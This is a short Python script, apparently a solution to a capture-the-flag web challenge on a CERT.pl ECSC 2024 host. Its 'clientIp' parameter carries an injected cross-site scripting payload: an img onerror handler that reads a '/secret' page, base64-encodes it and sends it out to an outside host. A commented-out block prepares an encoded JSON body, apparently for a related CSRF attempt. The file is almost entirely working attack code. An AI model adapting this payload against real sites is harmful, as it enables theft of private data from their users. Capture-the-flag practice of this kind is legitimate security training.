import requests
import base64

res = requests.get(
    'https://s69.ecsc24.hack.cert.pl/save',
    allow_redirects=False,
    params={
        'email': '👋@ptrc.gay',
        'password': 'a',
        'clientIp': 'fe80::1"><img src="#" onerror="fetch(`/secret`).then(r=>r.text()).then(r=>fetch(`https://kyouko.torastian.com/`+btoa(r)))',
        'fax': '427272727',
    }
)
print(res.url)
# data = '''
# {"email": "csrfptrcnull.me", "password": "woof %s", "fax": "427272727", "bankingPet": true, "maidenName": true, "clientIp": "127.0.0.1"}
# '''.strip()
# print(base64.b64encode(data.encode()).decode())
